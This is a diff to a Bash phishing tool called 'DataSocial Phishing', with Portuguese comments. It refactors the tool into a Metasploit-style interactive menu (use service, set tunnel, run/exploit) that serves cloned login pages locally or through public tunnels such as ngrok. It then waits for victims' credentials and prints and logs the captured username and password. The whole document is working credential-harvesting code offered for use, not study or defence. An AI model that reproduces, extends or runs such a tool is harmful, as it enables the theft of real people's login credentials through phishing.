-    echo $count
+
+	while [ ! -f "$data_file" ]; do
+		if [ $silentKey -eq 0 ]; then
+			printf "\r\e[K${blue}[*]${reset} Aguardando credenciais... %c" "${spinner:i++%${#spinner}:1}"
+		fi
+
+		sleep 0.5
+	done
+
+	[ ! -d logs ] && mkdir logs
+
+	cat "$data_file" > $log_file
+
+	if [ $silentKey -eq 0 ]; then
+		printf "\r\e[K${green}[+]${reset} Credenciais capturadas: \n"
+	fi
+
+	usuario=$(sed -n 's/^Usuário: //p' "$data_file")
+	senha=$(sed -n 's/^Senha: //p' "$data_file")
+
+	if [ $silentKey -eq 0 ]; then
+		echo -e "    ${yellow}[Usuário]${reset}	$usuario"
+		echo -e "    ${yellow}[Senha]${reset}   	$senha"
+
+		printf "\r\e[K${blue}[+]${reset} Seu log está in: ${magenta}logs/datasocial.txt${reset}\n"
+	fi
+
+	tput cnorm
+
 }
 
+# Lista todas as chaves disponíveis de um array associativo passado como parâmetro.
+listST() {
+	local arrayName="$1"
+	
+	declare -n assoc="$arrayName"
 
-### Banner modo interativo
+	for st in "${!assoc[@]}"; do
+		echo "- $st"
+	done
+}	
 
+# Lista todos os serviços disponíveis.
+listServices() { listST "services"; }
+# Lista todos os túneis disponíveis.
+listTunnels () { listST "tunnels"; }
 
-banner_two() {
+printModuleInfo() {	
+	echo -e "\n${reset}Module options (service/${selectedService:-No service}):\n"
+	
+	printf "  %-15s %-20s %-10s %-s\n" "Name" "Current Setting" "Required" "Description"
+	printf "  %-15s %-20s %-10s %-s\n" "----" "------- -------" "--------" "-----------"
 
-    version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
-    dateUpdate=$(grep "^# v.*" datasocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)
-
-    echo -e "\n\n"
-    toilet -f slant DataSocial --metal
-
-    echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m$(total_services)\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
-    echo -e "\n\n"
+	printf "  %-15s %-20s %-10s %-s\n" "Tunnel" "${selectedTunnel:-No tunnel}" "no" "Especify the tunnel"
+	printf "  %-15s %-20s %-10s %-s\n" "Port" "${selectedPort:-1492}" "yes" "Port to listen or connect"
+	echo ""
 }
 
+# Menu interativo
+interactiveMenu() {
+	showBannerInteractive
 
-### Modo interativo
+	while true; do
+		if [[ -n "$selectedService" ]]; then
+			prompt="${reset}${under}dsf${reset} ${reset}service(${red}${selectedService}${reset}) > "
+		else
+			prompt="${reset}${under}dsf${reset} > "
+		fi
+	
+		read -e -a cmd_parts -p "$(echo -e "$prompt")"
 
-interactiveMode() {
-    checkProot
-    checkReq
-    banner_two
-    menu
+		cmd="${cmd_parts[0]}"
+		arg="${cmd_parts[1]}"
+		target="${cmd_parts[2]}"
+		
+		history -s "${cmd_parts[*]}" # Adiciona ao históric
+		history -a 		  # Salva o histórico no arquivo
+		
+		[[ -z "$cmd" ]] && continue
+
+		case "$cmd" in
+			help | \?) showHelpInteractive;;
+			show)
+				case "$arg" in
+					services) listST "services";;
+					tunnels) listST "tunnels";;
+					options) printModuleInfo;;
+					*) echo -e "\n${reset}Commands = services - tunnels - options ?${reset}\n";;
+				esac
+				;;
+				
+			use)
+				if [[ "$arg" == "service" && -n "$target" ]]; then
+					if checkST "services" "$target"; then
+						selectedService="$target"
+					else
+						echo "Serviço não encontrado."
+					fi
+				else
+					echo "Commands = service - help ?"
+				fi
+				;;
+
+			set)
+				if [[ -z "$selectedService" ]]; then
+					echo "Selecione um serviço antes de definir qualquer configuração."
+					continue
+				fi
+
+				if [[ "$arg" == "tunnel" && -n "$target" ]]; then
+					if checkST "tunnels" "$target"; then
+						selectedTunnel="$target"
+					else
+						echo "Túnel não encontrado."
+					fi
+					
+				elif [[ "$arg" == "silent" && -n "$target" ]]; then
+					case "$target" in
+						on) silentKey=1;;
+						off) silentKey=0;;
+						*) echo "Commands = help - ?";;
+					esac
+					
+				else
+					echo "Commands = tunnel - help ?"
+				fi
+				;;
+
+			run|execute|exploit)
+				if [[ -n "$selectedService" && -z "$selectedTunnel" ]]; then
+					listenServerLocalhost "$selectedService" && getData
+				elif [[ -n "$selectedService" && -n "$selectedTunnel" ]]; then
+					listenServerLocalhost "$selectedService"
+					listenServerPublic "$selectedTunnel" && getData
+				else
+					echo "Erro ao processar o comando."
+				fi
+				;;
+				
+			exit | quit) break;;
+			
+			*) echo "Commands = help - ?";;
+		esac
+	done
 }
 
+[ -z "$1" ] && showHelp
 
-### Verificação
+# Processa os argumentos fornecidos ao script e executa ações baseadas neles.
+while [ -n "$1" ]; do
+	case "$1" in
+		-h| --help) showHelp;;
+		-v| --version) showVersion;;
+		
+		--auth-ngrok)
+			shift
 
-if [ -z "$1" ] ; then
-    banner
-    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError, try -h,--help for more help\e[0m"
-    exit 0
-fi
+			# Verifique se o token foi fornecido e grava a achave
+			
+			if [ -z "$1" ]; then
+				echo "Precisa do token."
+				exit 1
+			fi
+			
+			token="$1"
+			addNgrokToken "$token"
+			;;
 
+		--generate-ssh-key)
+			shift
 
-### Tratamento de opçôes
+			# Verifica se o e-mail foi fornecido e gera a chave SSH
+			if [ -z "$1" ]; then
+				echo "Precisa de um e-mail válido."
+				exit 1
+			fi
 
-while [ -n "$1" ] ; do
-    case "$1" in
-	-h | --help) helper;;
-	
-	-v | --version) version && exit 0;;
+			email="$1"
+			generateSshKey "$email"
+			;;
+			
+		--listen)
+			shift	
 
-	--add-token)
-	    shift
-	    
-	    if [ -z "$1" ] ; then
-		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel name to add the access token\e[0m"
-		exit 1
-	    fi
+			# Verifica se o serviço foi fornecido e seleciona o serviço para escutar
+			if [ -z "$1" ]; then
+				echo "Precisa de um serviço"
+				exit 1
+			fi
 
-	    tokenAccess="$1"
-	    tokenAccessKey=1
-	    ;;
-	
-	-S | --services)
-	    list ./websites "services" && exit 0;;
-	
-	-T | --tunnels)
-	    list ./tunnels "tunnels" && exit 0;;
-	
-	-s | --service)
-	    shift
+			serviceSelected="$1"
+			serviceSelectedKey=1
+			;;
 
-	    if [ -z "$1" ] ; then
-		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mSpecify the service\e[0m"
-		exit 1
-	    fi
+		--tunnel)
+			shift
 
-	    if [ ! -d  ./websites/$1 ] ; then
-		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid service $1\e[0m"
-		exit
-	    fi
+			# Verifica se o túnel foi fornecido e seleciona o túnel
+			if [ -z "$1" ] ; then
+				echo "Precisa de um tunnel"
+				exit 1
+			fi
 
-	    serviceKey=1
-	    serviceSelected="$1";;
+			tunnelSelected="$1"
+			tunnelSelectedKey=1
+			;;
 
-	-l | --listenServer)
-	    listenKey=1;;
-	
-	-t | --tunnel)
-	    shift
+		--services) listServices;;
+		--tunnels) listTunnels;;
 
-	    if [ -z "$1" ] ; then
-		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel\e[0m"
-		exit 1
-	    fi
+		--silent) silentKey=1;;
+		-i|--interactive) interactiveMenu;;
+		*) 
+			# Caso a opção fornecida não seja válida
+			echo "Opção $1 inválida!"
+			exit 1;;
+	esac
 
-	    if [ ! -f  ./tunnels/$1 ] ; then
-		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid tunnel $1\e[0m"
-		exit
-	    fi
-	    
-	    tunnelKey=1
-	    tunnelSelected="$1"
-	
-	    ;;
-	
-        -i | --interactive)
-	    interactiveMode;;
-
-	*)
-	    echo -e "\e[0m[\e[31;1m!\e[0m] Invalid option: $1\e[0m" && exit 1;;
-    esac
-    shift
+	shift
 done
 
+# Verifica se um serviço foi selecionado e se não foi selecionado um túnel,
+# então inicializa o servidor local e captura os dados.
+# Se ambos, serviço e túnel, foram selecionados, inicia tanto o servidor local quanto o público,
+# e captura os dados. Caso contrário, exibe um erro.
+[ $serviceSelectedKey -eq 1 -a ! $tunnelSelectedKey -eq 1 ] && {
+	listenServerLocalhost "$serviceSelected"
+	getData
+}
 
-### Execução
-
-
-if [ "$tokenAccessKey" == 1 ] ; then
-    checkReq && checkProot && addTokenAccess
-    
-elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
-    checkReq && checkProot && listen && getDataCaptured
-
-elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
-    checkReq && checkProot && listen && getDataCaptured
-
-else
-    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError processing command, try: -h,--help for more details\e[0m"
-    exit 1
-fi
+[ $serviceSelectedKey -eq 1 -a $tunnelSelectedKey -eq 1 ] && {
+	listenServerLocalhost "$serviceSelected"
+	listenServerPublic "$tunnelSelected"
+	getData
+}
